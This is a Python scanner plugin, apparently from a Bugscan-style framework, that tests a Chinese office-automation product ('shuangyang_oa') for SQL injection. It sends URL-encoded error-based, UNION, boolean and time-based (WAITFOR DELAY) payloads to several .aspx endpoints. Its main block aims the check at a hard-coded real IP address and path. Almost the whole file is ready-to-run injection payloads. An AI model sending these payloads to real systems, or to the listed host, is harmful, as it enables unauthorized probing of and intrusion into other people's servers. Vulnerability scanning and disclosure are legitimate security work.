#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0113260

import re
import time

def assign(service, arg):
    if service == "shuangyang_oa":
        return True, arg

def audit(arg):
    payloads = [
        'ObjSwitch/HYTZ.aspx?userid=1',
        'RCMANAGE_New/rcgl.aspx?UID=1',
        'Personnel/VacationComputation.aspx?id=1',
        'Office_Supplies/Goods_Main.aspx?type=1&info_id=1',
        'FormBuilder/yjzxList.aspx?id=1'
        ]
    getdatas = ['%20and%20db_name%281%29%3E1',
    '%20AND%208929%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288929%3D8929%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29'
        ]
    for payload in payloads:
        for getdata in getdatas:
            url = arg + payload 
            code, head, res, errcode, _ = curl.curl2(url + getdata)
            if 'master' in res or 'qxzzq1qxxbq' in res :
                security_hole(url + "  :found sql Injection")
    
    
    payload = 'FormBuilder/PrintFormList.aspx?file_id=1'
    getdata = '%29%20UNION%20ALL%20SELECT%20CHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%2899%29%2bCHAR%2873%29%2bCHAR%28110%29%2bCHAR%2876%29%2bCHAR%2886%29%2bCHAR%2869%29%2bCHAR%2874%29%2bCHAR%28104%29%2bCHAR%2886%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28120%29%2bCHAR%28113%29%2CNULL--'
    url = arg + payload 
    code, head, res, errcode, _ = curl.curl2(url + getdata)
    if 'qxqxqbcInLVEJhVqpkxq' in res:
        security_hole(url + "  :found sql Injection")
    
    
    payload = 'FormBuilder/PrintFormList.aspx?file_id=1'
    getdata1 = '%29%20or%201%3D1--'
    getdata2 = '%29%20or%201%3D2--'
    url = arg + payload
    code1, head1, res1, errcode1, _ = curl.curl2(url + getdata1)
    code2, head2, res2, errcode2, _ = curl.curl2(url + getdata2)
    m1 = re.findall('option',res1)
    m2 = re.findall('option',res2)
    if m1 != m2 :
        security_hole(url + "  :found sql Injection")
    
    
    payload = 'FormBuilder/yjzxList.aspx?id=1'
    getdata = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
    url = arg + payload
    t1 = time.time()
    code1, head, res1, errcode1, _ = curl.curl2(url)
    t2 = time.time()
    code2, head, res2, errcode2, _ = curl.curl2(url+getdata)
    t3 = time.time()
    if t3-2*t2+t1>3:    
        security_hole(url + "  :found sql Injection")
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('shuangyang_oa', 'http://221.199.203.230:9001/dsoa/')[1])